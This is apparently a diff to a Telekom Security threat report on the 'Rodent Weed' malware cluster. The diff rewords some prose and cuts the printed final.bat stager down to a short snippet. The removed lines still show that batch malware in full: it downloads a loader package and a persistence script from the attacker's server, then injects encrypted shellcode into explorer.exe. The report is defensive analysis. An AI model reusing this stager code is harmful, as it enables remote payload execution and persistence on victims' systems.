@@ -13,7 +13,7 @@ report_version: '1.0'
 Threat activity clusters rarely remain static over time. Delivery methods, lure formats, and payload choices often change between campaigns, while the underlying tradecraft remains stable enough to support tracking and detection. 
 This report covers activity that Telekom Security tracks as Rodent Weed. We have monitored this cluster since 2024 and across observed campaigns, the first-stage wrapper has varied, including SVG attachments, HTML files, and, more recently, Dropbox links. Some campaigns presented victims with a convincing decoy PDF, while others omitted the decoy entirely. The final payload has also rotated across commodity remote access trojans (RATs) and information stealers.
 
-Despite these variations, the core execution chain has remained consistent. A document-themed lure moves the victim from the browser into Windows Explorer, where a WebDAV share is exposed through a temporary TryCloudflare tunnel. A shortcut or script then initiates the next stage, batch files prepare the environment, a portable Python runtime is deployed to disk, and Donut executes the final payload in memory. <!--more-->
+Despite these variations, the core execution chain has remained consistent. A document-themed lure transitions the victim from the browser to Windows Explorer, where a WebDAV share is accessed via a temporary TryCloudflare tunnel. A shortcut or script then initiates the next stage, batch files prepare the environment, a portable Python runtime is deployed to disk, and the final payload is executed in memory. <!--more-->
 
 ---
 
@@ -169,7 +169,7 @@ explorer.exe
 
 ### Batch staging and a portable Python runtime
 
-`final.bat` relaunched itself hidden through PowerShell and created its working directory in ``%APPDATA%\Microsoft\Windows\Crypto\RSA\Cache\``.
+`final.bat` relaunched itself hidden through PowerShell and created its working directory in ``%APPDATA%\Microsoft\Windows\Crypto\RSA\Cache\`` as shown in the code snippet below.
 
 ```batch
 @echo off
@@ -192,222 +192,10 @@ set PACKAGE_FILE=files.zip
 set PERSISTENCE_FILE=add_to_startup.bat
 set PYTHON_URL=https://www.python.org/ftp/python/%PYTHON_VERSION%/python-%PYTHON_VERSION%-embed-%ARCH%.zip
 set GETPIP_URL=https://bootstrap.pypa.io/get-pip.py
+......
 
-echo ======================================== > "%LOGFILE%"
-echo Execution started: %date% %time% >> "%LOGFILE%"
-echo Working directory: %BASEDIR% >> "%LOGFILE%"
-echo ======================================== >> "%LOGFILE%"
-echo. >> "%LOGFILE%"
-
-echo ========================================
-echo    Encrypted Shellcode Loader Setup
-echo ========================================
-echo [INFO] Working directory: %BASEDIR%
-echo.
-
-echo [+] Downloading Python...
-echo [+] Downloading Python... >> "%LOGFILE%"
-powershell -Command "Invoke-WebRequest '%PYTHON_URL%' -OutFile '%ZIPFILE%' -UseBasicParsing"
-if errorlevel 1 (
-    echo [!] Failed to download Python
-    echo [!] Failed to download Python >> "%LOGFILE%"
-    pause
-    exit /b 1
-)
-
-echo [+] Extracting Python...
-echo [+] Extracting Python... >> "%LOGFILE%"
-if exist "%BASEDIR%\python.exe" del "%BASEDIR%\python.exe" 2>nul
-powershell -Command "Expand-Archive '%ZIPFILE%' '%BASEDIR%' -Force"
-if errorlevel 1 (
-    echo [!] Failed to extract Python
-    echo [!] Failed to extract Python >> "%LOGFILE%"
-    pause
-    exit /b 1
-)
-
-for %%F in ("%BASEDIR%\python*._pth") do set PTHFILE=%%F
-if exist "%PTHFILE%" (
-    echo. >> "%PTHFILE%"
-    echo Lib>>"%PTHFILE%"
-    echo Lib\site-packages>>"%PTHFILE%"
-    powershell -Command "(Get-Content '%PTHFILE%') -replace '# import site','import site' | Set-Content '%PTHFILE%'"
-) else (
-    echo [!] Python PTH file not found >> "%LOGFILE%"
-)
-
-set PATH=%BASEDIR%;%BASEDIR%\Scripts;%PATH%
-cd /d "%BASEDIR%"
-echo [DEBUG] Current directory: %cd% >> "%LOGFILE%"
-
-echo [+] Installing pip...
-echo [+] Installing pip... >> "%LOGFILE%"
-"%BASEDIR%\python.exe" -m pip --version >nul 2>&1
-if errorlevel 1 (
-    powershell -Command "Invoke-WebRequest '%GETPIP_URL%' -OutFile '%GETPIP%' -UseBasicParsing"
-    "%BASEDIR%\python.exe" "%GETPIP%" --no-warn-script-location
-    if errorlevel 1 (
-        "%BASEDIR%\python.exe" -m ensurepip --default-pip
-    )
-)
-
-echo [+] Installing psutil...
-echo [+] Installing psutil... >> "%LOGFILE%"
-"%BASEDIR%\python.exe" -m pip install psutil --no-warn-script-location
-
-echo [+] Installing cryptography...
-echo [+] Installing cryptography... >> "%LOGFILE%"
-"%BASEDIR%\python.exe" -m pip install cryptography --no-warn-script-location
-
-echo [+] Installing pyaes...
-echo [+] Installing pyaes... >> "%LOGFILE%"
-"%BASEDIR%\python.exe" -m pip install pyaes --no-warn-script-location
-
-echo.
-echo [+] Downloading loader package...
-echo. >> "%LOGFILE%"
-echo [+] Downloading loader package... >> "%LOGFILE%"
-powershell -Command "Invoke-WebRequest '%SERVER_URL%/%PACKAGE_FILE%' -OutFile '%PACKAGE_ZIP%' -UseBasicParsing"
-if errorlevel 1 (
-    echo [!] Failed to download package
-    echo [!] Failed to download package >> "%LOGFILE%"
-    pause
-    goto :end
-)
-
-echo [+] Extracting package...
-echo [+] Extracting package... >> "%LOGFILE%"
-powershell -Command "Expand-Archive '%PACKAGE_ZIP%' '%BASEDIR%' -Force"
-if errorlevel 1 (
-    echo [!] Failed to extract package
-    echo [!] Failed to extract package >> "%LOGFILE%"
-    pause
-    goto :end
-)
-
-echo.
-echo [+] Downloading persistence script...
-echo. >> "%LOGFILE%"
-echo [+] Downloading persistence script... >> "%LOGFILE%"
-powershell -Command "Invoke-WebRequest '%SERVER_URL%/%PERSISTENCE_FILE%' -OutFile '%PERSISTENCE_SCRIPT%' -UseBasicParsing"
-if errorlevel 1 (
-    echo [!] Failed to download persistence script
-    echo [!] Failed to download persistence script >> "%LOGFILE%"
-) else (
-    echo [+] Persistence script downloaded
-)
-
-echo.
-echo [+] Checking files...
-echo. >> "%LOGFILE%"
-echo [+] Checking files... >> "%LOGFILE%"
-
-if not exist "%BASEDIR%\encrypted_loader.py" (
-    echo [!] ERROR: encrypted_loader.py not found
-    echo [!] ERROR: encrypted_loader.py not found >> "%LOGFILE%"
-    echo [!] Files in directory: >> "%LOGFILE%"
-    dir "%BASEDIR%" /b >> "%LOGFILE%"
-    pause
-    goto :end
-)
-
-if not exist "%BASEDIR%\as_encrypted.bin" (
-    echo [!] ERROR: as_encrypted.bin not found
-    echo [!] ERROR: as_encrypted.bin not found >> "%LOGFILE%"
-    echo [!] Files in directory: >> "%LOGFILE%"
-    dir "%BASEDIR%" /b >> "%LOGFILE%"
-    pause
-    goto :end
-)
-
-if not exist "%BASEDIR%\as_key.bin" (
-    echo [!] ERROR: as_key.bin not found
-    echo [!] ERROR: as_key.bin not found >> "%LOGFILE%"
-    echo [!] Files in directory: >> "%LOGFILE%"
-    dir "%BASEDIR%" /b >> "%LOGFILE%"
-    pause
-    goto :end
-)
-
-echo [+] All files found:
-echo     - encrypted_loader.py
-echo     - as_encrypted.bin
-echo     - as_key.bin
-
-echo [+] All files found: >> "%LOGFILE%"
-echo     - encrypted_loader.py >> "%LOGFILE%"
-echo     - as_encrypted.bin >> "%LOGFILE%"
-echo     - as_key.bin >> "%LOGFILE%"
-
-for %%I in ("%BASEDIR%\as_key.bin") do set KEY_SIZE=%%~zI
-if %KEY_SIZE% neq 48 (
-    echo [!] WARNING: Key file is %KEY_SIZE% bytes (expected 48)
-    echo [!] WARNING: Key file is %KEY_SIZE% bytes (expected 48) >> "%LOGFILE%"
-)
-
-echo. >> "%LOGFILE%"
-echo [DEBUG] Current directory: %cd% >> "%LOGFILE%"
-echo [DEBUG] Python path: %BASEDIR%\python.exe >> "%LOGFILE%"
-echo [DEBUG] Full directory path: %BASEDIR% >> "%LOGFILE%"
-echo [DEBUG] File listing: >> "%LOGFILE%"
-dir "%BASEDIR%" >> "%LOGFILE%"
-
-echo.
-echo [+] Running loader...
-echo Command: python encrypted_loader.py -f as_encrypted.bin explorer.exe
-echo.
-
-echo. >> "%LOGFILE%"
-echo [+] Running loader... >> "%LOGFILE%"
-echo Command: python encrypted_loader.py -f as_encrypted.bin explorer.exe >> "%LOGFILE%"
-echo Execution start: %time% >> "%LOGFILE%"
-
-"%BASEDIR%\python.exe" "encrypted_loader.py" -f "as_encrypted.bin" explorer.exe
-set CMD_RESULT=%errorlevel%
-
-echo Execution end: %time% >> "%LOGFILE%"
-echo Exit code: %CMD_RESULT% >> "%LOGFILE%"
-
-echo.
-if %CMD_RESULT% equ 0 (
-    echo [+] SUCCESS: Shellcode execution completed!
-    echo [+] SUCCESS: Shellcode execution completed! >> "%LOGFILE%"
-) else (
-    echo [!] ERROR: Loader failed with code %CMD_RESULT%
-    echo [!] ERROR: Loader failed with code %CMD_RESULT% >> "%LOGFILE%"
-)
-
-REM Run persistence script if downloaded
-if exist "%PERSISTENCE_SCRIPT%" (
-    echo.
-    echo [+] Setting up persistence...
-    call "%PERSISTENCE_SCRIPT%"
-)
-
-:end
-echo.
-echo ========================================
-echo    SETUP COMPLETE
-echo ========================================
-echo.
-echo Files are in: %BASEDIR%
-echo Log file: %LOGFILE%
-echo To run again manually:
-echo   cd "%BASEDIR%"
-echo   python encrypted_loader.py -f as_encrypted.bin explorer.exe
-echo.
-
-echo. >> "%LOGFILE%"
-echo ======================================== >> "%LOGFILE%"
-echo SETUP COMPLETE >> "%LOGFILE%"
-echo Exit code: %CMD_RESULT% >> "%LOGFILE%"
-echo Directory: %BASEDIR% >> "%LOGFILE%"
-echo ======================================== >> "%LOGFILE%"
-
-echo Press any key to exit...
-pause >nul
 ```
-<p class="code-caption">File 4. final.bat</p>
+<p class="code-caption">File 4. final.bat Snippet</p>
 
 {: .space-before-sm}
 
